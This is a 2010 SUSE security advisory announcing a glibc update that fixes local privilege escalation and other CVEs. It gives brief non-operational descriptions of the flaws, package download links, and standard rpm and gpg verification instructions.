\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
SUSE Security Announcement
Package: glibc
Announcement ID: SUSE-SA:2010:052
Date: Thu, 28 Oct 2010 09:00:00 +0000
Affected Products: openSUSE 11.1
openSUSE 11.2
openSUSE 11.3
SLE SDK 10 SP3
SUSE Linux Enterprise Desktop 10 SP3
SUSE Linux Enterprise Server 10 SP3
SUSE Linux Enterprise Software Development Kit 11
SUSE Linux Enterprise Desktop 11
SUSE Linux Enterprise Server 11
SUSE Linux Enterprise Software Development Kit 11 SP1
SUSE Linux Enterprise Desktop 11 SP1
SUSE Linux Enterprise Server 11 SP1
Vulnerability Type: local privilege escalation
CVSS v2 Base Score: 7.2 (AV:L/AC:L/Au:N/C:C/I:C/A:C)
SUSE Default Package: yes
Cross-References: CVE-2008-1391, CVE-2010-0015, CVE-2010-0296
CVE-2010-0830, CVE-2010-3847, CVE-2010-3856
Content of This Advisory:
1) Security Vulnerability Resolved:
glibc local privilege escalation problem
Problem Description
2) Solution or Work-Around
3) Special Instructions and Notes
4) Package Location and Checksums
5) Pending Vulnerabilities, Solutions, and Work-Arounds:
See SUSE Security Summary Report.
6) Authenticity Verification and Additional Information
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
1) Problem Description and Brief Discussion
The Linux C library glibc was updated to fix critical security issues and several bugs:
CVE-2010-3847: Decoding of the $ORIGIN special value in various LD\_
environment variables allowed local attackers to execute code in
context of e.g. setuid root programs, elevating privileges.
This specific issue did not affect SUSE as an assertion triggers
before the respective code is executed. The bug was fixed by this
update nevertheless.
CVE-2010-3856: The LD\_AUDIT environment was not pruned during setuid
root execution and could load shared libraries from standard system
library paths.
This could be used by local attackers to inject code into setuid root
programs and so elevated privileges.
Both of these were found by Tavis Ormandy and we thank him for finding
and reporting those issues.
SUSE Linux Enterprise Server 9 is not affected by the above problems,
as its glibc does neither support LD\_AUDIT nor the $ORIGIN expansion
required by the first problem.
On openSUSE 11.1, 11.2 and SUSE Linux Enterprise 10 Service Pack 3
and SUSE Linux Enterprise 11 GA also the following minor security
issues were fixed:
CVE-2010-0830: Integer overflow causing arbitrary code execution
in ld.so --verify mode could be induced by a specially crafted
binary. This would require running the code on untrusted code which
we did not consider likely.
We thank Dan Rosenberg for reporting this problem.
CVE-2010-0296: The addmntent() function would not escape the newline
character properly, allowing the user to insert arbitrary newlines
to the /etc/mtab; if the addmntent() is run by a setuid mount binary
that does not do extra input check, this would allow custom entries
to be inserted in /etc/mtab.
We thank Dan Rosenberg and Jeff Layton for reporting this problem.
CVE-2008-1391: The strfmon() function contains an integer overflow
vulnerability in width specifiers handling that could be triggered
by an attacker that can control the format string passed to strfmon().
We thank Maksymilian Arciemowicz for reporting this problem.
CVE-2010-0015: Some setups (mainly Solaris-based legacy setups)
include shadow information (password hashes) as so-called "adjunct
passwd" table, mangling it with the rest of passwd columns instead
of keeping it in the shadow table. Normally, Solaris will disclose
this information only to clients bound to a privileged port, but
when nscd is deployed on the client, getpwnam() would disclose the
password hashes to all users. New mode "adjunct as shadow" can now
be enabled in /etc/default/nss that will move the password hashes
from the world-readable passwd table to emulated shadow table (that
is not cached by nscd).
We thank Christoph Pleger for reporting this problem.
2) Solution or Work-Around
There is no known workaround, please install the update packages.
3) Special Instructions and Notes
A reboot is not required to activate this change.
However as old processes will still be using the old C library, a reboot
is at least recommended.
4) Package Location and Checksums
The preferred method for installing security updates is to use the YaST
"Online Update" module or the "zypper" commandline tool. The package and
patch management stack will detect which updates are required and
automatically perform the necessary steps to verify and install them.
Alternatively, download the update packages for your distribution manually
and verify their integrity by the methods listed in Section 6 of this
announcement. Then install the packages using the command
rpm -Fhv <file.rpm>
to apply the update, replacing <file.rpm> with the filename of the
downloaded RPM package.
x86 Platform:
openSUSE 11.3:
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-2.11.2-3.3.1.i586.rp...](http://download.opensuse.org/update/11.3/rpm/i586/glibc-2.11.2-3.3.1.i586.rpm)
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-devel-2.11.2-3.3.1.i...](http://download.opensuse.org/update/11.3/rpm/i586/glibc-devel-2.11.2-3.3.1.i586.rpm)
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-html-2.11.2-3.3.1.i5...](http://download.opensuse.org/update/11.3/rpm/i586/glibc-html-2.11.2-3.3.1.i586.rpm)
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-i18ndata-2.11.2-3.3....](http://download.opensuse.org/update/11.3/rpm/i586/glibc-i18ndata-2.11.2-3.3.1.i586.rpm)
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-info-2.11.2-3.3.1.i5...](http://download.opensuse.org/update/11.3/rpm/i586/glibc-info-2.11.2-3.3.1.i586.rpm)
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-locale-2.11.2-3.3.1....](http://download.opensuse.org/update/11.3/rpm/i586/glibc-locale-2.11.2-3.3.1.i586.rpm)
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-obsolete-2.11.2-3.3....](http://download.opensuse.org/update/11.3/rpm/i586/glibc-obsolete-2.11.2-3.3.1.i586.rpm)
[http://download.opensuse.org/update/11.3/rpm/i586/glibc-profile-2.11.2-3.3.1...](http://download.opensuse.org/update/11.3/rpm/i586/glibc-profile-2.11.2-3.3.1.i586.rpm)
<http://download.opensuse.org/update/11.3/rpm/i586/nscd-2.11.2-3.3.1.i586.rpm>
openSUSE 11.2:
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-2.10.1-10.9.1.i586.r...](http://download.opensuse.org/update/11.2/rpm/i586/glibc-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-devel-2.10.1-10.9.1....](http://download.opensuse.org/update/11.2/rpm/i586/glibc-devel-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-html-2.10.1-10.9.1.i...](http://download.opensuse.org/update/11.2/rpm/i586/glibc-html-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-i18ndata-2.10.1-10.9...](http://download.opensuse.org/update/11.2/rpm/i586/glibc-i18ndata-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-info-2.10.1-10.9.1.i...](http://download.opensuse.org/update/11.2/rpm/i586/glibc-info-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-locale-2.10.1-10.9.1...](http://download.opensuse.org/update/11.2/rpm/i586/glibc-locale-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-obsolete-2.10.1-10.9...](http://download.opensuse.org/update/11.2/rpm/i586/glibc-obsolete-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/glibc-profile-2.10.1-10.9....](http://download.opensuse.org/update/11.2/rpm/i586/glibc-profile-2.10.1-10.9.1.i586.rpm)
[http://download.opensuse.org/update/11.2/rpm/i586/nscd-2.10.1-10.9.1.i586.rp...](http://download.opensuse.org/update/11.2/rpm/i586/nscd-2.10.1-10.9.1.i586.rpm)
openSUSE 11.1:
<http://download.opensuse.org/update/11.1/rpm/i586/glibc-2.9-2.13.1.i586.rpm>
[http://download.opensuse.org/update/11.1/rpm/i586/glibc-devel-2.9-2.13.1.i58...](http://download.opensuse.org/update/11.1/rpm/i586/glibc-devel-2.9-2.13.1.i586.rpm)
[http://download.opensuse.org/update/11.1/rpm/i586/glibc-html-2.9-2.13.1.i586...](http://download.opensuse.org/update/11.1/rpm/i586/glibc-html-2.9-2.13.1.i586.rpm)
[http://download.opensuse.org/update/11.1/rpm/i586/glibc-i18ndata-2.9-2.13.1....](http://download.opensuse.org/update/11.1/rpm/i586/glibc-i18ndata-2.9-2.13.1.i586.rpm)
[http://download.opensuse.org/update/11.1/rpm/i586/glibc-info-2.9-2.13.1.i586...](http://download.opensuse.org/update/11.1/rpm/i586/glibc-info-2.9-2.13.1.i586.rpm)
[http://download.opensuse.org/update/11.1/rpm/i586/glibc-locale-2.9-2.13.1.i5...](http://download.opensuse.org/update/11.1/rpm/i586/glibc-locale-2.9-2.13.1.i586.rpm)
[http://download.opensuse.org/update/11.1/rpm/i586/glibc-obsolete-2.9-2.13.1....](http://download.opensuse.org/update/11.1/rpm/i586/glibc-obsolete-2.9-2.13.1.i586.rpm)
[http://download.opensuse.org/update/11.1/rpm/i586/glibc-profile-2.9-2.13.1.i...](http://download.opensuse.org/update/11.1/rpm/i586/glibc-profile-2.9-2.13.1.i586.rpm)
<http://download.opensuse.org/update/11.1/rpm/i586/nscd-2.9-2.13.1.i586.rpm>
x86 Platform:
openSUSE 11.3:
[http://download.opensuse.org/update/11.3/rpm/i686/glibc-2.11.2-3.3.1.i686.rp...](http://download.opensuse.org/update/11.3/rpm/i686/glibc-2.11.2-3.3.1.i686.rpm)
[http://download.opensuse.org/update/11.3/rpm/i686/glibc-devel-2.11.2-3.3.1.i...](http://download.opensuse.org/update/11.3/rpm/i686/glibc-devel-2.11.2-3.3.1.i686.rpm)
openSUSE 11.2:
[http://download.opensuse.org/update/11.2/rpm/i686/glibc-2.10.1-10.9.1.i686.r...](http://download.opensuse.org/update/11.2/rpm/i686/glibc-2.10.1-10.9.1.i686.rpm)
[http://download.opensuse.org/update/11.2/rpm/i686/glibc-devel-2.10.1-10.9.1....](http://download.opensuse.org/update/11.2/rpm/i686/glibc-devel-2.10.1-10.9.1.i686.rpm)
openSUSE 11.1:
<http://download.opensuse.org/update/11.1/rpm/i686/glibc-2.9-2.13.1.i686.rpm>
[http://download.opensuse.org/update/11.1/rpm/i686/glibc-devel-2.9-2.13.1.i68...](http://download.opensuse.org/update/11.1/rpm/i686/glibc-devel-2.9-2.13.1.i686.rpm)
[http://download.opensuse.org/update/11.1/rpm/i686/glibc-html-2.9-2.13.1.i686...](http://download.opensuse.org/update/11.1/rpm/i686/glibc-html-2.9-2.13.1.i686.rpm)
[http://download.opensuse.org/update/11.1/rpm/i686/glibc-i18ndata-2.9-2.13.1....](http://download.opensuse.org/update/11.1/rpm/i686/glibc-i18ndata-2.9-2.13.1.i686.rpm)
[http://download.opensuse.org/update/11.1/rpm/i686/glibc-info-2.9-2.13.1.i686...](http://download.opensuse.org/update/11.1/rpm/i686/glibc-info-2.9-2.13.1.i686.rpm)
[http://download.opensuse.org/update/11.1/rpm/i686/glibc-locale-2.9-2.13.1.i6...](http://download.opensuse.org/update/11.1/rpm/i686/glibc-locale-2.9-2.13.1.i686.rpm)
[http://download.opensuse.org/update/11.1/rpm/i686/glibc-obsolete-2.9-2.13.1....](http://download.opensuse.org/update/11.1/rpm/i686/glibc-obsolete-2.9-2.13.1.i686.rpm)
[http://download.opensuse.org/update/11.1/rpm/i686/glibc-profile-2.9-2.13.1.i...](http://download.opensuse.org/update/11.1/rpm/i686/glibc-profile-2.9-2.13.1.i686.rpm)
<http://download.opensuse.org/update/11.1/rpm/i686/nscd-2.9-2.13.1.i686.rpm>
Power PC Platform:
openSUSE 11.1:
<http://download.opensuse.org/update/11.1/rpm/ppc/glibc-2.9-2.13.1.ppc.rpm>
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-64bit-2.9-2.13.1.ppc....](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-64bit-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-devel-2.9-2.13.1.ppc....](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-devel-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-devel-64bit-2.9-2.13....](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-devel-64bit-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-html-2.9-2.13.1.ppc.r...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-html-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-i18ndata-2.9-2.13.1.p...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-i18ndata-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-info-2.9-2.13.1.ppc.r...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-info-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-locale-2.9-2.13.1.ppc...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-locale-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-locale-64bit-2.9-2.13...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-locale-64bit-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-obsolete-2.9-2.13.1.p...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-obsolete-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-profile-2.9-2.13.1.pp...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-profile-2.9-2.13.1.ppc.rpm)
[http://download.opensuse.org/update/11.1/rpm/ppc/glibc-profile-64bit-2.9-2.1...](http://download.opensuse.org/update/11.1/rpm/ppc/glibc-profile-64bit-2.9-2.13.1.ppc.rpm)
<http://download.opensuse.org/update/11.1/rpm/ppc/nscd-2.9-2.13.1.ppc.rpm>
x86-64 Platform:
openSUSE 11.3:
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-2.11.2-3.3.1.x86\_6...](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-32bit-2.11.2-3.3.1...](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-32bit-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-devel-2.11.2-3.3.1...](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-devel-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-devel-32bit-2.11.2...](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-devel-32bit-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-html-2.11.2-3.3.1....](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-html-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-i18ndata-2.11.2-3....](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-i18ndata-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-info-2.11.2-3.3.1....](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-info-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-locale-2.11.2-3.3....](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-locale-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-locale-32bit-2.11....](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-locale-32bit-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-obsolete-2.11.2-3....](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-obsolete-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-profile-2.11.2-3.3...](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-profile-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/glibc-profile-32bit-2.11...](http://download.opensuse.org/update/11.3/rpm/x86_64/glibc-profile-32bit-2.11.2-3.3.1.x86_64.rpm)
[http://download.opensuse.org/update/11.3/rpm/x86\_64/nscd-2.11.2-3.3.1.x86\_64...](http://download.opensuse.org/update/11.3/rpm/x86_64/nscd-2.11.2-3.3.1.x86_64.rpm)
openSUSE 11.2:
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-2.10.1-10.9.1.x86\_...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-32bit-2.10.1-10.9....](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-32bit-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-devel-2.10.1-10.9....](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-devel-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-devel-32bit-2.10.1...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-devel-32bit-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-html-2.10.1-10.9.1...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-html-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-i18ndata-2.10.1-10...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-i18ndata-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-info-2.10.1-10.9.1...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-info-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-locale-2.10.1-10.9...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-locale-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-locale-32bit-2.10....](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-locale-32bit-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-obsolete-2.10.1-10...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-obsolete-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-profile-2.10.1-10....](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-profile-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/glibc-profile-32bit-2.10...](http://download.opensuse.org/update/11.2/rpm/x86_64/glibc-profile-32bit-2.10.1-10.9.1.x86_64.rpm)
[http://download.opensuse.org/update/11.2/rpm/x86\_64/nscd-2.10.1-10.9.1.x86\_6...](http://download.opensuse.org/update/11.2/rpm/x86_64/nscd-2.10.1-10.9.1.x86_64.rpm)
openSUSE 11.1:
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-2.9-2.13.1.x86\_64....](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-32bit-2.9-2.13.1.x...](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-32bit-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-devel-2.9-2.13.1.x...](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-devel-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-devel-32bit-2.9-2....](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-devel-32bit-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-html-2.9-2.13.1.x8...](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-html-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-i18ndata-2.9-2.13....](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-i18ndata-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-info-2.9-2.13.1.x8...](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-info-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-locale-2.9-2.13.1....](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-locale-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-locale-32bit-2.9-2...](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-locale-32bit-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-obsolete-2.9-2.13....](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-obsolete-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-profile-2.9-2.13.1...](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-profile-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/glibc-profile-32bit-2.9-...](http://download.opensuse.org/update/11.1/rpm/x86_64/glibc-profile-32bit-2.9-2.13.1.x86_64.rpm)
[http://download.opensuse.org/update/11.1/rpm/x86\_64/nscd-2.9-2.13.1.x86\_64.r...](http://download.opensuse.org/update/11.1/rpm/x86_64/nscd-2.9-2.13.1.x86_64.rpm)
Sources:
openSUSE 11.3:
[http://download.opensuse.org/update/11.3/rpm/src/glibc-2.11.2-3.3.1.nosrc.rp...](http://download.opensuse.org/update/11.3/rpm/src/glibc-2.11.2-3.3.1.nosrc.rpm)
<http://download.opensuse.org/update/11.3/rpm/src/glibc-2.11.2-3.3.1.src.rpm>
openSUSE 11.2:
[http://download.opensuse.org/update/11.2/rpm/src/glibc-2.10.1-10.9.1.nosrc.r...](http://download.opensuse.org/update/11.2/rpm/src/glibc-2.10.1-10.9.1.nosrc.rpm)
<http://download.opensuse.org/update/11.2/rpm/src/glibc-2.10.1-10.9.1.src.rpm>
openSUSE 11.1:
<http://download.opensuse.org/update/11.1/rpm/src/glibc-2.9-2.13.1.src.rpm>
Our maintenance customers are notified individually. The packages are
offered for installation from the maintenance web:
SLE SDK 10 SP3
[http://download.novell.com/patch/finder/?keywords=a7e1bffd1e2cae6bb5c9bbff3d...](http://download.novell.com/patch/finder/?keywords=a7e1bffd1e2cae6bb5c9bbff3d3f9de2)
SUSE Linux Enterprise Server 10 SP3
[http://download.novell.com/patch/finder/?keywords=a7e1bffd1e2cae6bb5c9bbff3d...](http://download.novell.com/patch/finder/?keywords=a7e1bffd1e2cae6bb5c9bbff3d3f9de2)
SUSE Linux Enterprise Desktop 10 SP3
[http://download.novell.com/patch/finder/?keywords=a7e1bffd1e2cae6bb5c9bbff3d...](http://download.novell.com/patch/finder/?keywords=a7e1bffd1e2cae6bb5c9bbff3d3f9de2)
SUSE Linux Enterprise Server 11
[http://download.novell.com/patch/finder/?keywords=5f11ad23d76a12882072f1f403...](http://download.novell.com/patch/finder/?keywords=5f11ad23d76a12882072f1f4032fd9a4)
[http://download.novell.com/patch/finder/?keywords=0582518152cdc4496cbc5acb4f...](http://download.novell.com/patch/finder/?keywords=0582518152cdc4496cbc5acb4f10c30c)
SUSE Linux Enterprise Desktop 11
[http://download.novell.com/patch/finder/?keywords=0582518152cdc4496cbc5acb4f...](http://download.novell.com/patch/finder/?keywords=0582518152cdc4496cbc5acb4f10c30c)
SUSE Linux Enterprise Software Development Kit 11
[http://download.novell.com/patch/finder/?keywords=0582518152cdc4496cbc5acb4f...](http://download.novell.com/patch/finder/?keywords=0582518152cdc4496cbc5acb4f10c30c)
SUSE Linux Enterprise Server 11 SP1
[http://download.novell.com/patch/finder/?keywords=23bdb7f8171760d0a927cc0088...](http://download.novell.com/patch/finder/?keywords=23bdb7f8171760d0a927cc00885b6d96)
SUSE Linux Enterprise Desktop 11 SP1
[http://download.novell.com/patch/finder/?keywords=23bdb7f8171760d0a927cc0088...](http://download.novell.com/patch/finder/?keywords=23bdb7f8171760d0a927cc00885b6d96)
SUSE Linux Enterprise Software Development Kit 11 SP1
[http://download.novell.com/patch/finder/?keywords=23bdb7f8171760d0a927cc0088...](http://download.novell.com/patch/finder/?keywords=23bdb7f8171760d0a927cc00885b6d96)
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
5) Pending Vulnerabilities, Solutions, and Work-Arounds:
See SUSE Security Summary Report.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
6) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file where you saved the
announcement. The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and the integrity of
a package needs to be verified to ensure that it has not been tampered
with.
The internal rpm package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on
RPMv4-based distributions) and the gpg key ring of 'root' during
installation. You can also find it on the first installation CD and at
the end of this announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.
The <security@suse.de> public key is listed below.
=====================================================================
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
The information in this advisory may be distributed or reproduced,
provided that the advisory is not modified in any way. In particular, the
clear text signature should show proof of the authenticity of the text.
SUSE Linux Products GmbH provides no warranties of any kind whatsoever
with respect to the information contained in this security advisory.
Type Bits/KeyID Date User ID
pub 2048R/3D25D3D9 1999-03-06 SuSE Security Team <security@suse.de>
pub 1024D/9C800ACA 2000-10-19 SuSE Package Signing Key <build@suse.de>
- -----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.4.2 (GNU/Linux)
mQENAzbhLQQAAAEIAKAkXHe0lWRBXLpn38hMHy03F0I4Sszmoc8aaKJrhfhyMlOA
BqvklPLE2f9UrI4Xc860gH79ZREwAgPt0pi6+SleNFLNcNFAuuHMLQOOsaMFatbz
JR9i4m/lf6q929YROu5zB48rBAlcfTm+IBbijaEdnqpwGib45wE/Cfy6FAttBHQh
1Kp+r/jPbf1mYAvljUfHKuvbg8t2EIQz/5yGp+n5trn9pElfQO2cRBq8LFpf1l+U
P7EKjFmlOq+Gs/fF98/dP3DfniSd78LQPq5vp8RL8nr/o2i7jkAQ33m4f1wOBWd+
cZovrKXYlXiR+Bf7m2hpZo+/sAzhd7LmAD0l09kABRG0JVN1U0UgU2VjdXJpdHkg
VGVhbSA8c2VjdXJpdHlAc3VzZS5kZT6JARUDBRA24S1H5Fiyh7HKPEUBAVcOB/9b
yHYji1/+4Xc2GhvXK0FSJN0MGgeXgW47yxDL7gmR4mNgjlIOUHZj0PEpVjWepOJ7
tQS3L9oP6cpj1Fj/XxuLbkp5VCQ61hpt54coQAvYrnT9rtWEGN+xmwejT1WmYmDJ
xG+EGBXKr+XP69oIUl1E2JO3rXeklulgjqRKos4cdXKgyjWZ7CP9V9daRXDtje63
Om8gwSdU/nCvhdRIWp/Vwbf7Ia8iZr9OJ5YuQl0DBG4qmGDDrvImgPAFkYFzwlqo
choXFQ9y0YVCV41DnR+GYhwl2qBd81T8aXhihEGPIgaw3g8gd8B5o6mPVgl+nJqI
BkEYGBusiag2pS6qwznZiQEVAwUQNuEtBHey5gA9JdPZAQFtOAf+KVh939b0J94u
